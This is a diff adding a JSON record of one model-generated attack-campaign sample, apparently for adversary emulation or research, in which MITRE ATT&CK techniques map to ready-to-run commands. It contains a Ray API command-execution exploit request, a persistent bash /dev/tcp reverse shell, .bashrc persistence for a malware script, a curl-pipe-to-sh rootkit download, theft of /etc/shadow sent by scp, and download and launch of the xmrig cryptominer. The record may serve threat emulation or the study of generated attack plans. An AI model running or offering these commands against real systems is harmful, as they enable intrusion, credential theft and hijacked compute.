@@ -1,0 +1,107 @@
+{
+  "campaign_id": "C0045",
+  "model": "gpt-oss:20b",
+  "sample": 3,
+  "temperature": 0.7,
+  "realizations": [
+    {
+      "technique_id": "T1588.002",
+      "mechanism": "download-xmrig-tool",
+      "command": "curl -L https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-linux-x64.tar.gz -o /tmp/xmrig.tar.gz && tar xzf /tmp/xmrig.tar.gz -C /usr/local/bin/",
+      "target": "actor.primary",
+      "parameters": {
+        "url": "https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-linux-x64.tar.gz",
+        "dest": "/tmp/xmrig.tar.gz"
+      }
+    },
+    {
+      "technique_id": "T1190",
+      "mechanism": "ray-cve-48022-exploit",
+      "command": "python3 -c \"import requests; r=requests.post('http://{ray_ip}:{ray_port}/api/v2/runs', json={'command':'/bin/sh'}); print(r.text)\"",
+      "target": "endpoint.public_service",
+      "parameters": {
+        "ray_ip": "public_ray_server_ip",
+        "ray_port": "8265"
+      }
+    },
+    {
+      "technique_id": "T1059.006",
+      "mechanism": "python-pty-reverse-shell",
+      "command": "python3 -c \"import os,pty; pty.spawn(['/bin/bash','-i']); os.system('bash -c \\\"while true; do bash -i >& /dev/tcp/{rev_ip}/{rev_port} 0>&1; done\\\"\")\"",
+      "target": "target.primary",
+      "parameters": {
+        "rev_ip": "channel.private_http.ip",
+        "rev_port": "4444"
+      }
+    },
+    {
+      "technique_id": "T1546.004",
+      "mechanism": "modify-bashrc",
+      "command": "echo 'python3 /usr/local/bin/malware.py &' >> ~/.bashrc",
+      "target": "target.primary",
+      "parameters": {
+        "file_path": "~/.bashrc"
+      }
+    },
+    {
+      "technique_id": "T1068",
+      "mechanism": "privilege-escalation-rootkit",
+      "command": "curl -L https://example.com/root_payload.sh | sh",
+      "target": "target.primary",
+      "parameters": {
+        "url": "https://example.com/root_payload.sh"
+      }
+    },
+    {
+      "technique_id": "T1027.013",
+      "mechanism": "base64-runner",
+      "command": "python3 -c \"import base64,sys; exec(base64.b64decode(sys.argv[1]))\" $(bash -lc 'echo aGVsbG8gd29ybGQ=' )",
+      "target": "target.primary",
+      "parameters": {
+        "encoded_script": "aGVsbG8gd29ybGQ="
+      }
+    },
+    {
+      "technique_id": "T1003.008",
+      "mechanism": "read-shadow",
+      "command": "cat /etc/shadow | tee /tmp/hashes.txt && scp /tmp/hashes.txt actor.primary:/tmp/",
+      "target": "target.primary",
+      "parameters": {
+        "source": "/etc/shadow",
+        "dest_local": "/tmp/hashes.txt"
+      }
+    },
+    {
+      "technique_id": "T1016",
+      "mechanism": "dns-query-ip",
+      "command": "dig @resolver.example.com myip.opendns.com +short",
+      "target": "target.primary",
+      "parameters": {
+        "resolver_domain": "myip.opendns.com"
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "mechanism": "download-execute-xmrig",
+      "command": "curl -L https://example.com/xmrig.tar.gz | tar xzf - && ./xmrig --config /etc/xmrig/config.json",
+      "target": "target.primary",
+      "parameters": {
+        "url": "https://example.com/xmrig.tar.gz",
+        "config_path": "/etc/xmrig/config.json"
+      }
+    },
+    {
+      "technique_id": "T1496.001",
+      "mechanism": "start-gpu-miner",
+      "command": "./xmrig --gpu 1 --config /etc/xmrig/config.json",
+      "target": "target.primary",
+      "parameters": {
+        "flags": "--gpu 1"
+      }
+    }
+  ],
+  "raw_proposal_keys": [
+    "realizations"
+  ],
+  "response_sha256": "0cf38d49ab6b3c967c14fc3c8da3e84c3913348e2400375edf9588df7be7c0dc"
+}
